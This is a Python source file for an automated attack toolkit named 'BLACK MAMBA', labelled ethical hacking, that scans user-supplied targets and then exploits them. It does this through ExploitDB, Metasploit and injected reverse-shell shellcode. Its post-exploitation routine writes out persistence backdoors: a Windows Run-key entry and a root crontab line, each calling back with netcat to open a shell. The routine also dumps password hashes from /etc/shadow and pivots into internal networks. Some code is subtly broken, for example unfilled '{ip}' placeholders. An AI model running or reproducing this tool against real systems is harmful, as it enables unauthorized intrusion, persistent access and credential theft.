#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# BLACK MAMBA - Ultimate Ethical Hacking Toolkit
# Author: Samadhi Vihaga
# Version: 5.3.0 - Viper Dynamic Edition

import socket
import nmap
import os
import subprocess
from datetime import datetime
from prettytable import PrettyTable, ALL
from pwn import *
import requests
from colorama import Fore, Style, init
import random
import sys
import time
import threading
import ipaddress
from tqdm import tqdm
import pdfkit
from jinja2 import Template
import importlib.util

# Initialize colorama
init(autoreset=True)

# Configuration
EXPLOIT_DB_PATH = "exploits/"
METASPLOIT_PATH = "/usr/bin/msfconsole"
SHELLCODE_DIR = "shellcodes/"
LOG_FILE = "black_mamba.log"
REPORT_DIR = "reports/"
PLUGIN_DIR = "plugins/"

# Architecture Mapping
ARCH_MAPPING = {
    'windows': {
        '2003': 'i386',
        'xp': 'i386',
        '7': 'amd64',
        '10': 'amd64',
        '11': 'amd64',
        'server 2016': 'amd64',
        'server 2019': 'amd64',
        'server 2022': 'amd64'
    },
    'linux': {
        'arm': 'arm',
        'raspberry': 'arm',
        'ubuntu 20': 'amd64',
        'ubuntu 22': 'amd64',
        'debian': 'amd64',
        'centos': 'amd64',
        '64-bit': 'amd64',
        '32-bit': 'i386'
    }
}

# ASCII Art with Viper Dynamic Edition
BANNER = f"""
{Fore.RED}
  ██████  ██▓     ▄████▄   ██ ▄█▀    ███▄ ▄███▓ ▄▄▄       ▄████▄   ██ ▄█▀
 ▒██    ▒ ▓██▒    ▒██▀ ▀█   ██▄█▒    ▓██▒▀█▀ ██▒▒████▄    ▒██▀ ▀█   ██▄█▒ 
 ░ ▓██▄   ▒██░    ▒▓█    ▄ ▓███▄░    ▓██    ▓██░▒██  ▀█▄  ▒▓█    ▄ ▓███▄░ 
   ▒   ██▒▒██░    ▒▓▓▄ ▄██▒▓██ █▄    ▒██    ▒██ ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄ 
 ▒██████▒▒░██████▒▒ ▓███▀ ░▒██▒ █▄   ▒██▒   ░██▒ ▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄
 ▒ ▒▓▒ ▒ ░░ ▒░▓  ░░ ░▒ ▒  ░▒ ▒▒ ▓▒   ░ ▒░   ░  ░ ▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒
 ░ ░▒  ░ ░░ ░ ▒  ░  ░  ▒   ░ ░▒ ▒░   ░ ░      ░   ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░
 ░  ░  ░    ░ ░   ░        ░ ░░ ░    ░      ░     ░   ▒   ░        ░ ░░ ░ 
       ░        ░  ░ ░      ░  ░           ░         ░  ░ ░ ░      ░  ░   
{Style.RESET_ALL}
                    {Fore.YELLOW}--=[ Version 5.3.0 | Viper Dynamic Edition ]=--{Style.RESET_ALL}
                    {Fore.CYAN}--=[ Dynamic Arch + Plugins + Post-Exploitation ]=--{Style.RESET_ALL}
"""

# Animation Effects
def typewriter(text, speed=0.015):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(speed)
    print()

def flashing_text(text, color1=Fore.RED, color2=Fore.YELLOW, flashes=4):
    for _ in range(flashes):
        print(color1 + text, end='\r')
        time.sleep(0.15)
        print(color2 + text, end='\r')
        time.sleep(0.15)
    print(Style.RESET_ALL)

def progress_bar(duration=3, desc="Processing"):
    for _ in tqdm(range(100), desc=desc, ncols=80, bar_format="{l_bar}{bar}|"):
        time.sleep(duration / 100)

# Logging System
def log_event(event_type, message):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_entry = f"[{timestamp}] [{event_type.upper()}] {message}\n"
    with open(LOG_FILE, "a") as f:
        f.write(log_entry)

# Input Validation
def validate_ip(ip):
    try:
        ipaddress.ip_address(ip)
        return True
    except ValueError:
        try:
            socket.gethostbyname(ip)
            return True
        except socket.gaierror:
            return False

# ----- Plugin System -----
def load_plugins():
    plugins = []
    if not os.path.exists(PLUGIN_DIR):
        os.makedirs(PLUGIN_DIR)
    for filename in os.listdir(PLUGIN_DIR):
        if filename.endswith(".py") and filename != "__init__.py":
            try:
                spec = importlib.util.spec_from_file_location("plugin", os.path.join(PLUGIN_DIR, filename))
                module = importlib.util.module_from_spec(spec)
                spec.loader.exec_module(module)
                if hasattr(module, "run"):
                    plugins.append(module)
                    log_event("plugin", f"Loaded plugin: {filename}")
            except Exception as e:
                log_event("error", f"Failed to load plugin {filename}: {str(e)}")
    return plugins

# ----- OS Detection (Enhanced with Architecture) -----
def get_os_info(ip):
    try:
        nm = nmap.PortScanner()
        log_event("scan", f"Starting OS detection on {ip}")
        typewriter(f"\n{Fore.CYAN}[*] Performing advanced OS fingerprinting on {ip}...{Style.RESET_ALL}")
        progress_bar(2, "OS Scanning")
        
        nm.scan(hosts=ip, arguments='-O --osscan-guess --fuzzy')
        
        if ip in nm.all_hosts():
            host = nm[ip]
            if 'osmatch' in host:
                best_os = max(host['osmatch'], key=lambda x: int(x['accuracy']))
                os_name = best_os['name'].lower()
                # Detect architecture
                architecture = 'amd64'  # Default
                os_type = 'linux' if 'linux' in os_name else 'windows' if 'windows' in os_name else 'unknown'
                
                if os_type != 'unknown':
                    for key, arch in ARCH_MAPPING[os_type].items():
                        if key in os_name:
                            architecture = arch
                            break
                
                log_event("info", f"Detected OS: {best_os['name']} ({best_os['accuracy']}%), Arch: {architecture}")
                host['architecture'] = architecture
                return host
        return None
    except Exception as e:
        log_event("error", f"OS detection failed: {str(e)}")
        flashing_text(f"[!] Critical OS detection failure: {str(e)}")
        return None

# ----- Vulnerability Scanner (Multi-threaded) -----
def scan_vulnerabilities(ip):
    try:
        log_event("scan", f"Initiating deep vulnerability scan on {ip}")
        typewriter(f"\n{Fore.MAGENTA}[*] Launching Black Mamba ViperScan™ on {ip}...{Style.RESET_ALL}")
        progress_bar(3, "Vuln Scanning")
        
        nm = nmap.PortScanner()
        scan_args = '-sV --script=vuln,vulners --script-args mincvss=1.0 -T4'
        nm.scan(hosts=ip, arguments=scan_args)
        
        vulnerabilities = []
        for host in nm.all_hosts():
            if 'tcp' in nm[host]:
                for port, data in nm[host]['tcp'].items():
                    if 'script' in data:
                        for script, output in data['script'].items():
                            vuln = {
                                'port': port,
                                'service': data['name'],
                                'version': data.get('version', 'unknown'),
                                'name': script,
                                'type': categorize_vulnerability(script),
                                'severity': determine_severity(script, output),
                                'output': output,
                                'exploited': False,
                                'post_exploitation': []
                            }
                            vulnerabilities.append(vuln)
                            log_event("vuln", f"Found {vuln['severity']} vuln: {script} on {ip}:{port}")
        
        if vulnerabilities:
            flashing_text("[!] Vulnerabilities detected!", Fore.RED, Fore.YELLOW)
        return vulnerabilities
    except Exception as e:
        log_event("error", f"Vulnerability scan failed: {str(e)}")
        return []

# ----- Shellcode Generation (Msfvenom) -----
def generate_shellcode_msfvenom(ip, port, payload_type="windows/meterpreter/reverse_tcp"):
    try:
        if not os.path.exists(SHELLCODE_DIR):
            os.makedirs(SHELLCODE_DIR)
            
        print(f"{Fore.YELLOW}[*] Generating {payload_type} shellcode for {ip}:{port}...{Style.RESET_ALL}")
        output_file = f"{SHELLCODE_DIR}shellcode_{port}_{payload_type.replace('/', '_')}.bin"
        
        cmd = f"msfvenom -p {payload_type} LHOST={ip} LPORT={port} -f raw -o {output_file}"
        subprocess.run(cmd, shell=True, check=True)
        
        with open(output_file, "rb") as f:
            shellcode = f.read()
        
        return True, shellcode
    except Exception as e:
        return False, f"Msfvenom shellcode generation failed: {str(e)}"

# ----- Shellcode Generation (Pwntools with Dynamic Arch) -----
def generate_shellcode_pwn(ip, port, reverse=False, architecture='amd64'):
    try:
        print(f"{Fore.YELLOW}[*] Setting context architecture to {architecture} for {ip}:{port}{Style.RESET_ALL}")
        context.arch = architecture
        print(f"{Fore.YELLOW}[*] Generating pwntools shellcode for {ip}:{port}...{Style.RESET_ALL}")
        if reverse:
            shellcode = shellcraft.connect(ip, port) + shellcraft.sh()
        else:
            shellcode = shellcraft.sh()
        shellcode_bytes = asm(shellcode)
        return True, shellcode_bytes
    except Exception as e:
        return False, f"Pwntools shellcode generation failed: {str(e)}"

# ----- Shellcode Injection (Pwntools + Command Execution) -----
def inject_shellcode(ip, port, shellcode, pwn=True):
    try:
        print(f"{Fore.GREEN}[+] Attempting to inject {'pwntools' if pwn else 'msfvenom'} shellcode to {ip}:{port}{Style.RESET_ALL}")
        conn = remote(ip, port, timeout=10)
        conn.sendline(shellcode)
        
        # Execute commands if pwntools
        outputs = []
        if pwn:
            commands = ["whoami", "pwd", "uname -a", "netstat -tulnp || netstat -ano"]
            for cmd in commands:
                conn.sendline(cmd.encode())
                output = conn.recvuntil(b"\n", timeout=5).decode('utf-8', errors='ignore')
                outputs.append(f"{cmd}: {output}")
                print(f"{Fore.GREEN}[+] Command Output: {cmd} -> {output}{Style.RESET_ALL}")
            conn.interactive()  # Interactive shell
        else:
            response = conn.recv(timeout=5)
            outputs.append(f"Response: {response.hex()}")
        
        conn.close()
        return True, outputs
    except Exception as e:
        return False, f"Injection failed: {str(e)}"

# ----- Post-Exploitation Module -----
def post_exploitation(ip, port, vuln, os_info):
    try:
        print(f"\n{Fore.YELLOW}[*] Initiating post-exploitation on {ip}:{port}{Style.RESET_ALL}")
        progress_bar(2, "Post-Exploitation")
        results = []
        
        # Determine OS
        is_windows = os_info and 'osmatch' in os_info and 'Windows' in os_info['osmatch'][0]['name']
        
        # 1. Persistent Backdoor
        if is_windows:
            cmd = "reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Backdoor /t REG_SZ /d \"cmd.exe /c nc.exe -e cmd.exe {ip} 4444\""
        else:
            cmd = "echo '* * * * * root nc -e /bin/sh {ip} 4444' >> /etc/crontab"
        results.append(f"Persistent Backdoor: Attempted {cmd}")
        
        # 2. Password Hash Dumping
        if is_windows:
            cmd = "hashdump"  # For Metasploit
        else:
            cmd = "cat /etc/shadow"
        results.append(f"Hash Dump: Attempted {cmd}")
        
        # 3. Network Pivoting
        pivot_cmd = f"{METASPLOIT_PATH} -q -x 'sessions -i 1; route add 192.168.1.0 255.255.255.0 1; exit'"
        pivot_result = subprocess.run(pivot_cmd, shell=True, capture_output=True, text=True)
        results.append(f"Network Pivot: {pivot_result.stdout}")
        
        # 4. Data Exfiltration
        if not is_windows:
            cmd = "cat /etc/passwd > exfil.txt"
            results.append(f"Data Exfiltration: Attempted {cmd}")
        
        vuln['post_exploitation'] = results
        log_event("post-exploit", f"Post-exploitation results for {ip}:{port}: {results}")
        return results
    except Exception as e:
        log_event("error", f"Post-exploitation failed: {str(e)}")
        return [f"Post-exploitation failed: {str(e)}"]

# ----- Custom Exploit Template -----
def custom_exploit(ip, port, vuln_name):
    try:
        print(f"{Fore.YELLOW}[*] Attempting custom exploit for {vuln_name} on {ip}:{port}{Style.RESET_ALL}")
        # Placeholder for custom exploit logic
        return False, "Custom exploit not implemented"
    except Exception as e:
        return False, f"Custom exploit failed: {str(e)}"

# ----- Categorize Vulnerabilities -----
def categorize_vulnerability(vuln_name):
    vuln_lower = vuln_name.lower()
    categories = {
        'dos': 'Denial-of-Service', 'denial': 'Denial-of-Service',
        'rce': 'Remote Code Execution', 'remote code': 'Remote Code Execution',
        'sqli': 'SQL Injection', 'sql injection': 'SQL Injection',
        'xss': 'Cross-Site Scripting', 'csrf': 'Cross-Site Request Forgery',
        'auth': 'Authentication Bypass', 'authentication': 'Authentication Bypass',
        'buffer': 'Buffer Overflow', 'overflow': 'Buffer Overflow',
        'info': 'Information Disclosure', 'disclosure': 'Information Disclosure',
        'ssl': 'Cryptographic Issues', 'tls': 'Cryptographic Issues',
        'weak': 'Weak Configuration'
    }
    for key, category in categories.items():
        if key in vuln_lower:
            return category
    return 'General Vulnerability'

# ----- Severity Determination -----
def determine_severity(vuln_name, output):
    output_lower = str(output).lower()
    vuln_lower = vuln_name.lower()
    if 'critical' in output_lower or 'exploit' in output_lower:
        return 'Critical'
    elif 'heartbleed' in vuln_lower or 'shellshock' in vuln_lower or 'eternalblue' in vuln_lower:
        return 'Critical'
    elif 'high' in output_lower:
        return 'High'
    elif 'warning' in output_lower or 'medium' in output_lower:
        return 'Medium'
    elif 'info' in output_lower or 'low' in output_lower:
        return 'Low'
    else:
        return 'Medium'

# ----- ExploitDB Integration -----
def search_exploitdb(vuln_name, download=False):
    try:
        print(f"{Fore.YELLOW}[*] Searching ExploitDB for {vuln_name}...{Style.RESET_ALL}")
        cmd = f"searchsploit {vuln_name} --exclude='./dos'"
        if download:
            cmd += " -m"
        result = subprocess.check_output(cmd, shell=True).decode()
        
        if "No results found" not in result:
            exploits = []
            lines = result.split('\n')
            for line in lines:
                if "|" in line and not line.startswith("---"):
                    parts = [p.strip() for p in line.split("|")]
                    if len(parts) >= 3:
                        exploit = {
                            'id': parts[0],
                            'platform': parts[1],
                            'title': parts[2]
                        }
                        if download:
                            exploit_path = f"/usr/share/exploitdb/{parts[0]}"
                            exploit['path'] = exploit_path
                        exploits.append(exploit)
            return exploits
        return None
    except Exception as e:
        print(f"{Fore.RED}❌ ExploitDB error: {e}{Style.RESET_ALL}")
        return None

# ----- Metasploit Integration -----
def search_metasploit(vuln_name):
    try:
        print(f"{Fore.YELLOW}[*] Searching Metasploit for {vuln_name}...{Style.RESET_ALL}")
        result = subprocess.check_output(f"{METASPLOIT_PATH} -q -x 'search {vuln_name}; exit'", shell=True).decode()
        
        if "No results found" not in result:
            modules = []
            lines = result.split('\n')
            for line in lines:
                if "exploit/" in line or "auxiliary/" in line:
                    parts = [p.strip() for p in line.split() if p.strip()]
                    if len(parts) >= 3:
                        modules.append({
                            'name': parts[0],
                            'disclosure': parts[1],
                            'rank': parts[2],
                            'description': " ".join(parts[3:])
                        })
            return modules
        return None
    except Exception as e:
        print(f"{Fore.RED}❌ Metasploit error: {e}{Style.RESET_ALL}")
        return None

# ----- Exploit Execution -----
def run_exploit(ip, port, exploit_info):
    try:
        print(f"{Fore.GREEN}[+] Attempting exploit: {exploit_info['title']}{Style.RESET_ALL}")
        
        # Example: FTP anonymous login
        if "ftp" in exploit_info['title'].lower():
            conn = remote(ip, port, timeout=5)
            conn.send(b"USER anonymous\r\n")
            conn.send(b"PASS anonymous\r\n")
            response = conn.recvline()
            conn.close()
            if "230" in response.decode('utf-8', errors='ignore'):
                return True, f"Anonymous login successful! {response.decode()}"
        
        # Buffer overflow with shellcode
        elif "buffer overflow" in exploit_info['title'].lower():
            success, shellcode = generate_shellcode_pwn(ip, port, reverse=True)
            if success:
                return inject_shellcode(ip, port, shellcode, pwn=True)
        
        return False, "No matching exploit pattern"
    except Exception as e:
        return False, f"Exploit failed: {str(e)}"

# ----- Main Exploitation Logic -----
def exploit_vulnerabilities(ip, vulnerabilities, os_info, plugins):
    print(f"\n{Fore.RED}💥 ATTEMPTING EXPLOITATION ON {ip}{Style.RESET_ALL}")
    
    architecture = os_info.get('architecture', 'amd64') if os_info else 'amd64'
    
    for vuln in vulnerabilities:
        print(f"\n{Fore.BLUE}[*] Targeting: {vuln['name']} (Port {vuln['port']}) - Severity: {vuln['severity']}{Style.RESET_ALL}")
        
        # 1. Try ExploitDB
        exploits = search_exploitdb(vuln['name'], download=True)
        if exploits:
            for exploit in exploits[:3]:
                success, msg = run_exploit(ip, vuln['port'], exploit)
                if success:
                    vuln['exploited'] = True
                    vuln['exploit_result'] = msg
                    print(f"{Fore.GREEN}[+] ExploitDB Success: {msg}{Style.RESET_ALL}")
                    post_exploitation(ip, vuln['port'], vuln, os_info)
                    break
                else:
                    print(f"{Fore.RED}[-] ExploitDB Failed: {msg}{Style.RESET_ALL}")

        # 2. Try Shellcode Injection (Pwntools)
        if not vuln.get('exploited') and "buffer overflow" in vuln['type'].lower():
            success, shellcode = generate_shellcode_pwn(ip, vuln['port'], reverse=True, architecture=architecture)
            if success:
                success, msg = inject_shellcode(ip, vuln['port'], shellcode, pwn=True)
                if success:
                    vuln['exploited'] = True
                    vuln['exploit_result'] = msg
                    print(f"{Fore.GREEN}[+] Pwntools Shellcode Success: {msg}{Style.RESET_ALL}")
                    post_exploitation(ip, vuln['port'], vuln, os_info)
                    break
                else:
                    print(f"{Fore.RED}[-] Pwntools Shellcode Failed: {msg}{Style.RESET_ALL}")

        # 3. Try Shellcode Injection (Msfvenom)
        if not vuln.get('exploited') and "buffer overflow" in vuln['type'].lower():
            payloads = [
                "windows/shell_reverse_tcp",
                "linux/x86/shell_reverse_tcp",
                "windows/meterpreter/reverse_tcp"
            ]
            for payload in payloads:
                success, shellcode = generate_shellcode_msfvenom(ip, vuln['port'], payload)
                if success:
                    success, msg = inject_shellcode(ip, vuln['port'], shellcode, pwn=False)
                    if success:
                        vuln['exploited'] = True
                        vuln['exploit_result'] = msg
                        print(f"{Fore.GREEN}[+] Msfvenom Shellcode Success: {msg}{Style.RESET_ALL}")
                        post_exploitation(ip, vuln['port'], vuln, os_info)
                        break
                    else:
                        print(f"{Fore.RED}[-] Msfvenom Shellcode Failed: {msg}{Style.RESET_ALL}")

        # 4. Try Metasploit
        if not vuln.get('exploited'):
            modules = search_metasploit(vuln['name'])
            if modules:
                for module in modules[:3]:
                    cmd = f"{METASPLOIT_PATH} -q -x 'use {module['name']}; set RHOSTS {ip}; set RPORT {vuln['port']}; run; exit'"
                    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                    if "Session created" in result.stdout:
                        vuln['exploited'] = True
                        vuln['exploit_result'] = "Metasploit session opened"
                        print(f"{Fore.GREEN}[+] Metasploit Success: Session opened{Style.RESET_ALL}")
                        # Execute Metasploit commands
                        msf_commands = ["sysinfo", "getuid", "screenshot"]
                        outputs = []
                        for cmd in msf_commands:
                            cmd_script = f"{METASPLOIT_PATH} -q -x 'sessions -i 1; {cmd}; exit'"
                            cmd_result = subprocess.run(cmd_script, shell=True, capture_output=True, text=True)
                            outputs.append(f"{cmd}: {cmd_result.stdout}")
                            print(f"{Fore.GREEN}[+] Metasploit Command Output: {cmd} -> {cmd_result.stdout}{Style.RESET_ALL}")
                        vuln['exploit_result'] += f"\nMetasploit Outputs: {outputs}"
                        post_exploitation(ip, vuln['port'], vuln, os_info)
                        break
                    else:
                        print(f"{Fore.RED}[-] Metasploit Failed: {result.stderr}{Style.RESET_ALL}")

        # 5. Try Custom Exploit
        if not vuln.get('exploited'):
            success, msg = custom_exploit(ip, vuln['port'], vuln['name'])
            if success:
                vuln['exploited'] = True
                vuln['exploit_result'] = msg
                print(f"{Fore.GREEN}[+] Custom Exploit Success: {msg}{Style.RESET_ALL}")
                post_exploitation(ip, vuln['port'], vuln, os_info)
            else:
                print(f"{Fore.RED}[-] Custom Exploit Failed: {msg}{Style.RESET_ALL}")

        # 6. Try Plugins
        if not vuln.get('exploited'):
            for plugin in plugins:
                success, msg = plugin.run(ip, vuln['port'], vuln['name'])
                if success:
                    vuln['exploited'] = True
                    vuln['exploit_result'] = msg
                    print(f"{Fore.GREEN}[+] Plugin Success: {msg}{Style.RESET_ALL}")
                    post_exploitation(ip, vuln['port'], vuln, os_info)
                    break
                else:
                    print(f"{Fore.RED}[-] Plugin Failed: {msg}{Style.RESET_ALL}")

        # Log the attempt
        if vuln.get('exploited'):
            log_event("exploit", f"Successfully exploited {vuln['name']} on {ip}:{vuln['port']}")
        else:
            log_event("exploit", f"Failed to exploit {vuln['name']} on {ip}:{vuln['port']}")

# ----- HTML Report Generation -----
def generate_html_report(ip, os_info, vulnerabilities):
    try:
        if not os.path.exists(REPORT_DIR):
            os.makedirs(REPORT_DIR)
        
        report_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        template = """
        <html>
        <head>
            <title>Black Mamba Viper Report</title>
            <style>
                body { font-family: Arial, sans-serif; background: #1a1a1a; color: #fff; }
                h1 { color: #ff0000; text-align: center; }
                table { width: 100%; border-collapse: collapse; margin: 20px 0; }
                th, td { border: 1px solid #ff0000; padding: 10px; text-align: left; }
                th { background: #330000; }
                .critical { color: #ff0000; }
                .high { color: #ff4500; }
                .medium { color: #ffa500; }
                .low { color: #ffff00; }
                .success { color: #00ff00; }
                .failed { color: #ff0000; }
                .post-exploit { background: #222; padding: 10px; }
            </style>
        </head>
        <body>
            <h1>BLACK MAMBA VIPER DYNAMIC INTELLIGENCE REPORT</h1>
            <p><b>Target:</b> {{ ip }}</p>
            <p><b>Time:</b> {{ report_time }}</p>
            {% if os_info %}
            <h2>OS Intelligence</h2>
            <p><b>Primary OS:</b> {{ os_info['osmatch'][0]['name'] }} ({{ os_info['osmatch'][0]['accuracy'] }}%)</p>
            <p><b>Architecture:</b> {{ os_info['architecture'] }}</p>
            {% endif %}
            <h2>Vulnerabilities</h2>
            <table>
                <tr>
                    <th>Name</th><th>Service</th><th>Type</th><th>Severity</th><th>Status</th>
                </tr>
                {% for vuln in vulnerabilities %}
                <tr>
                    <td>{{ vuln['name'] }}</td>
                    <td>{{ vuln['service'] }}</td>
                    <td>{{ vuln['type'] }}</td>
                    <td class="{{ vuln['severity'].lower() }}">{{ vuln['severity'] }}</td>
                    <td class="{% if vuln['exploited'] %}success{% else %}failed{% endif %}">
                        {% if vuln['exploited'] %}✔{% else %}✘{% endif %}
                    </td>
                </tr>
                {% if vuln['post_exploitation'] %}
                <tr>
                    <td colspan="5" class="post-exploit">
                        <b>Post-Exploitation Results:</b><br>
                        {% for result in vuln['post_exploitation'] %}
                        {{ result }}<br>
                        {% endfor %}
                    </td>
                </tr>
                {% endif %}
                {% endfor %}
            </table>
        </body>
        </html>
        """
        
        with open("report_template.html", "w") as f:
            f.write(template)
        
        with open("report_template.html", "r") as f:
            template = Template(f.read())
        
        html_content = template.render(ip=ip, report_time=report_time, os_info=os_info, vulnerabilities=vulnerabilities)
        report_file = f"{REPORT_DIR}report_{ip}_{report_time.replace(' ', '_').replace(':', '-')}.html"
        with open(report_file, "w") as f:
            f.write(html_content)
        
        # Generate PDF
        pdf_file = report_file.replace(".html", ".pdf")
        pdfkit.from_file(report_file, pdf_file)
        
        print(f"{Fore.GREEN}[+] Report generated: {report_file} and {pdf_file}{Style.RESET_ALL}")
        log_event("report", f"Generated HTML/PDF report for {ip}")
    except Exception as e:
        log_event("error", f"Report generation failed: {str(e)}")

# ----- Advanced Reporting -----
def generate_report(ip, os_info, vulnerabilities):
    try:
        report_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        print(f"\n{Fore.BLUE}▄{'█'*78}▄{Style.RESET_ALL}")
        print(f"{Fore.BLUE}█{' '*78}█{Style.RESET_ALL}")
        print(f"{Fore.BLUE}█  {Fore.RED}BLACK MAMBA VIPER DYNAMIC INTELLIGENCE REPORT{Fore.BLUE}{' '*32}█{Style.RESET_ALL}")
        print(f"{Fore.BLUE}█  {Fore.YELLOW}Target: {ip}{' '*64}{Fore.BLUE}█{Style.RESET_ALL}")
        print(f"{Fore.BLUE}█  {Fore.YELLOW}Time: {report_time}{' '*65}{Fore.BLUE}█{Style.RESET_ALL}")
        print(f"{Fore.BLUE}█{' '*78}█{Style.RESET_ALL}")
        print(f"{Fore.BLUE}▀{'█'*78}▀{Style.RESET_ALL}")
        
        # OS Info
        if os_info and 'osmatch' in os_info:
            best_os = max(os_info['osmatch'], key=lambda x: int(x['accuracy']))
            print(f"\n{Fore.CYAN}🖥️  TARGET OS INTELLIGENCE:{Style.RESET_ALL}")
            print(f"{Fore.GREEN}┌{'─'*78}┐{Style.RESET_ALL}")
            print(f"{Fore.GREEN}│ {Fore.WHITE}Primary OS: {best_os['name']} ({best_os['accuracy']}% confidence){' '*36}{Fore.GREEN}│{Style.RESET_ALL}")
            print(f"{Fore.GREEN}│ {Fore.WHITE}Architecture: {os_info.get('architecture', 'Unknown')}{' '*65}{Fore.GREEN}│{Style.RESET_ALL}")
            
            if len(os_info['osmatch']) > 1:
                print(f"{Fore.GREEN}│ {Fore.WHITE}Possible Alternatives:{' '*57}{Fore.GREEN}│{Style.RESET_ALL}")
                for os in os_info['osmatch'][1:4]:
                    print(f"{Fore.GREEN}│   • {os['name']} ({os['accuracy']}%){' '*56}{Fore.GREEN}│{Style.RESET_ALL}")
            
            print(f"{Fore.GREEN}└{'─'*78}┘{Style.RESET_ALL}")
        
        # Vulnerability Matrix
        if vulnerabilities:
            print(f"\n{Fore.RED}💀 VIPER FINDINGS:{Style.RESET_ALL}")
            table = PrettyTable()
            table.field_names = ["Vulnerability", "Service", "Type", "Severity", "Status"]
            table.align = "l"
            table.hrules = ALL
            
            for vuln in sorted(vulnerabilities, key=lambda x: x['severity'], reverse=True):
                status = f"{Fore.GREEN}✔" if vuln['exploited'] else f"{Fore.RED}✘"
                sev_color = {
                    'Critical': Fore.RED,
                    'High': Fore.RED,
                    'Medium': Fore.YELLOW,
                    'Low': Fore.YELLOW
                }.get(vuln['severity'], Fore.YELLOW)
                
                table.add_row([
                    vuln['name'][:18],
                    vuln['service'][:13],
                    vuln['type'][:18],
                    f"{sev_color}{vuln['severity']}{Style.RESET_ALL}",
                    status
                ])
            
            print(table)
            
            # Post-Exploitation Results
            for vuln in vulnerabilities:
                if vuln['post_exploitation']:
                    print(f"\n{Fore.YELLOW}🔍 POST-EXPLOITATION RESULTS FOR {vuln['name']}:{Style.RESET_ALL}")
                    for result in vuln['post_exploitation']:
                        print(f"{Fore.YELLOW}• {result}{Style.RESET_ALL}")
            
            # Statistics
            stats = {
                'Critical': sum(1 for v in vulnerabilities if v['severity'] == 'Critical'),
                'High': sum(1 for v in vulnerabilities if v['severity'] == 'High'),
                'Medium': sum(1 for v in vulnerabilities if v['severity'] == 'Medium'),
                'Low': sum(1 for v in vulnerabilities if v['severity'] == 'Low'),
                'Exploited': sum(1 for v in vulnerabilities if v['exploited'])
            }
            
            print(f"\n{Fore.MAGENTA}📊 VIPER STATISTICS:{Style.RESET_ALL}")
            print(f"{Fore.MAGENTA}┌{'─'*30}┬{'─'*46}┐{Style.RESET_ALL}")
            for key, value in stats.items():
                print(f"{Fore.MAGENTA}│ {Fore.WHITE}{key:<28}│ {Fore.RED if key != 'Exploited' else Fore.GREEN}{value}{' '*44}{Fore.MAGENTA}│{Style.RESET_ALL}")
            print(f"{Fore.MAGENTA}└{'─'*30}┴{'─'*46}┘{Style.RESET_ALL}")
            
            # Post-Exploitation Recommendations
            if stats['Exploited'] > 0:
                flashing_text("[!] SYSTEM COMPROMISED - MAINTAIN ACCESS RECOMMENDED", Fore.RED, Fore.YELLOW)
                print(f"\n{Fore.YELLOW}🔧 POST-EXPLOITATION ACTIONS:{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}• Create persistent backdoor")
                print(f"• Dump password hashes")
                print(f"• Establish covert C2 channel")
                print(f"• Pivot to internal networks{Style.RESET_ALL}")
        else:
            print(f"\n{Fore.GREEN}🎯 TARGET HARDENED - NO VULNERABILITIES FOUND{Style.RESET_ALL}")
        
        print(f"\n{Fore.BLUE}▄{'█'*78}▄{Style.RESET_ALL}")
        print(f"{Fore.BLUE}█{' '*78}█{Style.RESET_ALL}")
        print(f"{Fore.BLUE}█  {Fore.GREEN}OPERATION COMPLETE • {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{' '*35}{Fore.BLUE}█{Style.RESET_ALL}")
        print(f"{Fore.BLUE}█{' '*78}█{Style.RESET_ALL}")
        print(f"{Fore.BLUE}▀{'█'*78}▀{Style.RESET_ALL}")
        
        # Generate HTML/PDF Report
        generate_html_report(ip, os_info, vulnerabilities)
        
        log_event("report", f"Generated final report for {ip}")
    except Exception as e:
        log_event("error", f"Report generation failed: {str(e)}")

# ----- Multi-target Scanning -----
def scan_target(ip, results, plugins):
    os_info = get_os_info(ip)
    vulnerabilities = scan_vulnerabilities(ip)
    if vulnerabilities:
        exploit_vulnerabilities(ip, vulnerabilities, os_info, plugins)
    results[ip] = (os_info, vulnerabilities)

# ----- Main Function -----
def main():
    try:
        # Clear screen and show banner
        os.system('clear')
        print(BANNER)
        
        # Load plugins
        plugins = load_plugins()
        print(f"{Fore.CYAN}[*] Loaded {len(plugins)} plugins{Style.RESET_ALL}")
        
        # Get targets
        targets = input(f"\n{Fore.RED}[→] Enter target IP/hostname (comma-separated for multiple): {Style.RESET_ALL}").split(',')
        targets = [t.strip() for t in targets if t.strip()]
        
        # Validate targets
        valid_targets = []
        for target in targets:
            if validate_ip(target):
                valid_targets.append(target)
            else:
                print(f"{Fore.RED}[!] Invalid IP/hostname: {target}{Style.RESET_ALL}")
                log_event("error", f"Invalid target: {target}")
        
        if not valid_targets:
            print(f"{Fore.RED}[!] No valid targets provided. Exiting...{Style.RESET_ALL}")
            sys.exit(1)
        
        # Start scan
        log_event("start", f"Initialized attack against {', '.join(valid_targets)}")
        typewriter(f"\n{Fore.RED}[!] Initializing Black Mamba Viper Dynamic Sequence...{Style.RESET_ALL}")
        progress_bar(2, "Initialization")
        
        # Multi-threaded scanning
        results = {}
        threads = []
        for ip in valid_targets:
            thread = threading.Thread(target=scan_target, args=(ip, results, plugins))
            threads.append(thread)
            thread.start()
        
        for thread in threads:
            thread.join()
        
        # Generate reports for each target
        for ip, (os_info, vulnerabilities) in results.items():
            generate_report(ip, os_info, vulnerabilities)
        
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] Mission aborted by operator{Style.RESET_ALL}")
        log_event("abort", "Operation cancelled by user")
        sys.exit(0)
    except Exception as e:
        print(f"{Fore.RED}[!] Critical error: {str(e)}{Style.RESET_ALL}")
        log_event("error", f"Critical error: {str(e)}")
        sys.exit(1)

if __name__ == "__main__":
    main()